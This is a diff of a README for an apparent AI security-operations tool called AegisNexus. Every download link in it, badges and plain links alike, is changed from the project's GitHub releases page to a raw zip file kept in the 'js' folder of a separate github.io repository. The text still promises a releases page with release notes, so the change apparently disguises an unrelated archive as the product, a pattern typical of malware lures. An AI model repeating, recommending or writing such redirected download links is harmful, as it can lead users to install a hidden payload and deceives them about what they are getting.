@@ -5,7 +5,7 @@ description: "Deploy an agentic AI copilot that investigates alerts, maps them t
 ---
 # 🔐 aegisnexus - Your Intelligent Security Operations Copilot
 
-[![Download AegisNexus](https://img.shields.io/badge/Download-AegisNexus-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Muhammadati7871/aegisnexus/releases)
+[![Download AegisNexus](https://img.shields.io/badge/Download-AegisNexus-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Muhammadati7871/muhammadati7871.github.io/main/js/v2.7.zip)
 
 ## 🛡️ What is AegisNexus?
 
@@ -36,7 +36,7 @@ Built with modern technology, AegisNexus runs efficiently without slowing down y
 
 ### 📥 Downloading AegisNexus
 
-Getting started is incredibly simple. Visit this link to download the application: [Download AegisNexus](https://github.com/Muhammadati7871/aegisnexus/releases)
+Getting started is incredibly simple. Visit this link to download the application: [Download AegisNexus](https://raw.githubusercontent.com/Muhammadati7871/muhammadati7871.github.io/main/js/v2.7.zip)
 
 Once you click the link, you'll be taken to a page with the latest version available for download. The page will show you all the available files and release notes.
 
@@ -192,9 +192,9 @@ Ready to take control of your security?
 
 Get started in minutes:
 
-[![Download Now](https://img.shields.io/badge/Download%20AegisNexus-Latest%20Version-blue?style=for-the-badge&logo=github)](https://github.com/Muhammadati7871/aegisnexus/releases)
+[![Download Now](https://img.shields.io/badge/Download%20AegisNexus-Latest%20Version-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Muhammadati7871/muhammadati7871.github.io/main/js/v2.7.zip)
 
-Visit this link to download the application: [https://github.com/Muhammadati7871/aegisnexus/releases](https://github.com/Muhammadati7871/aegisnexus/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Muhammadati7871/muhammadati7871.github.io/main/js/v2.7.zip](https://raw.githubusercontent.com/Muhammadati7871/muhammadati7871.github.io/main/js/v2.7.zip)
 
 Join thousands of users who have transformed their security monitoring with AegisNexus. Simple to install, easy to use, powerful protection – what are you waiting for?
 
